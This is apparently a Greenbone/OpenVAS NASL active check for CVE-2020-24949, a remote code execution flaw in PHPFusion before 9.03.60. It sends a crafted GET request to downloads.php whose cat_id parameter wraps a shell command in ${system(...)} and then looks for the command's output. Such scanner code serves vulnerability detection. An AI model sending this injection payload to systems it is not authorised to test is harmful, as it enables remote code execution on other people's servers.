# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:php-fusion:php-fusion";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146043");
  script_version("2024-05-24T19:38:34+0000");
  script_tag(name:"last_modification", value:"2024-05-24 19:38:34 +0000 (Fri, 24 May 2024)");
  script_tag(name:"creation_date", value:"2021-05-31 07:46:03 +0000 (Mon, 31 May 2021)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-06-01 17:17:00 +0000 (Tue, 01 Jun 2021)");

  script_cve_id("CVE-2020-24949");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("PHPFusion < 9.03.60 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_php_fusion_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("php-fusion/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"PHPFusion is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"RCE vulnerability in downloads/downloads.php.");

  script_tag(name:"affected", value:"PHP-Fusion version 9.03.50 and probably prior.");

  script_tag(name:"solution", value:"Update to version 9.03.60 or later.");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/162852/PHPFusion-9.03.50-Remote-Code-Execution.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

foreach pattern (keys(cmds)) {
  url = dir + "/infusions/downloads/downloads.php?cat_id=$%7Bsystem(" + cmds[pattern] + ")%7D";

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    result = eregmatch(pattern: pattern, string: res);
    report = 'It was possible to execute the "' + cmds[pattern] + '" command.\n\nResult:\n\n' + result[0];
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0); # Only if PHP Execution is enabled
